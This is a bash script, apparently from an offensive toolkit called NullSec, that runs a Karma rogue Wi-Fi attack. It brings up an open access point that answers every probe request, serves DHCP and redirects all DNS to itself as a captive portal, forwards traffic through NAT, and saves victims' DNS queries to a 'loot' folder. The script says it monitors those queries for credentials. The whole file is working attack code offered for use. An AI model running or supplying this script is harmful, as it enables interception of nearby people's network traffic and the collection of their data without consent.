#!/bin/bash
# NullSec Karma Attack
# Responds to all probe requests with matching APs

LOOT_DIR="/root/loot/karma"
AP_IFACE="${1:-wlan0}"
INTERNET_IFACE="${2:-eth0}"

mkdir -p "$LOOT_DIR"

echo "[*] NullSec Karma Attack"
echo "[*] AP Interface: $AP_IFACE"

# Configure interface
ifconfig $AP_IFACE up

# Create hostapd-karma config
cat > /tmp/hostapd-karma.conf << CONF
interface=$AP_IFACE
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel=6
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
# Karma mode - respond to all probes
karma=1
CONF

# Create dnsmasq config for captive portal
cat > /tmp/dnsmasq-karma.conf << CONF
interface=$AP_IFACE
dhcp-range=192.168.4.2,192.168.4.30,255.255.255.0,12h
dhcp-option=3,192.168.4.1
dhcp-option=6,192.168.4.1
log-queries
log-facility=/tmp/dns_queries.log
address=/#/192.168.4.1
CONF

# Configure IP
ifconfig $AP_IFACE 192.168.4.1 netmask 255.255.255.0

# Enable forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# NAT rules
iptables -t nat -A POSTROUTING -o $INTERNET_IFACE -j MASQUERADE
iptables -A FORWARD -i $AP_IFACE -o $INTERNET_IFACE -j ACCEPT
iptables -A FORWARD -i $INTERNET_IFACE -o $AP_IFACE -m state --state RELATED,ESTABLISHED -j ACCEPT

# Start services
hostapd /tmp/hostapd-karma.conf &
sleep 2
dnsmasq -C /tmp/dnsmasq-karma.conf &

echo "[+] Karma AP running"
echo "[*] Monitoring DNS queries for credentials..."

tail -f /tmp/dns_queries.log | while read line; do
    echo "$(date '+%H:%M:%S') $line" >> "$LOOT_DIR/karma_$(date +%Y%m%d).log"
done
